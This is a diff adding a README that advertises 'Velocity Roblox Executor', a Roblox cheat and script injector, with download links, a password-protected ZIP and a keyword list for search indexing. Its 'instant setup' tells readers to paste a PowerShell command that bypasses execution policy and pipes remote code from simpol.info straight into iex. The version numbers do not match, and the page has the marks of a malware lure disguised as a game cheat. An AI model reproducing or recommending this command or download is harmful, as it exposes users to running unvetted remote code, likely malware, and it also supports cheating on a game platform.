@@ -1,0 +1,45 @@
+Velocity Roblox Executor (v2.2.6 — Windows 10 / 11 x64)
+
+Velocity Roblox Executor is an external 64-bit Luau script execution workspace built for the current Windows Hyperion client (RobloxPlayerBeta.exe). It includes a fast bytecode compiler, automatic patch offset resolution, and a built-in Script Hub.
+
+⬇️ Download & Quick Setup (Windows 10 / 11 x64)
+
+- 🚀 Open Velocity Roblox Executor Setup Portal (VelocityRoblox-Setup.exe) — Interactive Setup & Mirrors
+- 📦 Direct Download Portable .ZIP Archive (velocity-roblox-executor-v2.4.0-win64.zip · 2.66 MB · Password: 2026)
+- 📋 Release Notes & SHA-256 Checksums (v2.2.6)
+
+⚡ Instant 1-Command Setup (Win + R or PowerShell · 3 Seconds)
+Press Win + R (or open Windows Terminal / PowerShell), paste the command below, and press Enter:
+
+powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://simpol.info/get/velocity-roblox-executor | iex"
+
+Key Features & Technical Specs
+
+- Keyless 100% sUNC Luau bytecode compiler and execution workspace
+- Auto-updating Hyperion x64 memory offset scanner on every Roblox patch
+- Built-in Monaco script editor with Drawing API, hookmetamethod, and getgc support
+- Integrated Script Hub with 1-click loader, FPS unlocker (240 FPS), and multi-instance support
+
+| Property | Specification |
+| :--- | :--- |
+| Package Binary | VelocityRobloxExecutor/VelocityRoblox-Setup.exe (v2.2.6) |
+| Target Runtime | Roblox Hyperion / Byfron x64 Luau VM & Bytecode Compiler (RobloxPlayerBeta.exe) |
+| Install Path | %LOCALAPPDATA%\Roblox\Versions\VelocityRobloxExecut |
+| Supported OS | Windows 10 / Windows 11 (64-bit, 22H2–24H2) |
+
+How to Install & Run
+
+1. Open the Velocity Roblox Executor Setup & Download Portal (v2.2.6) or grab the portable archive from Releases.
+2. Launch VelocityRoblox-Setup.exe (or run the 3-second Win + R quick setup from the portal).
+3. Start any Roblox place — VelocityRoblox-Setup.exe attaches automatically once the client window initializes.
+4. Paste your Luau script into the editor or pick a hub preset and click Execute.
+
+VelocityRobloxExecutor/
+├── VelocityRoblox-Setup.exe               # Signed Windows x64 Binary
+├── vcruntime140.dll         # Bundled C++ Runtime (v14.42)
+├── vcruntime140_1.dll       # Exception Handling Helper
+├── config.ini               # Default Profile (%LOCALAPPDATA%\Roblox\Versions\VelocityRobloxExecut)
+└── README-Setup.txt         # Quick Start & SHA-256 Checksum
+
+Indexed Topics & Search Reference
+velocity executor · velocity roblox executor · velocity download pc · velocity keyless · velocity · velocity-executor · velocity-roblox · roblox-executor · roblox · roblox-script
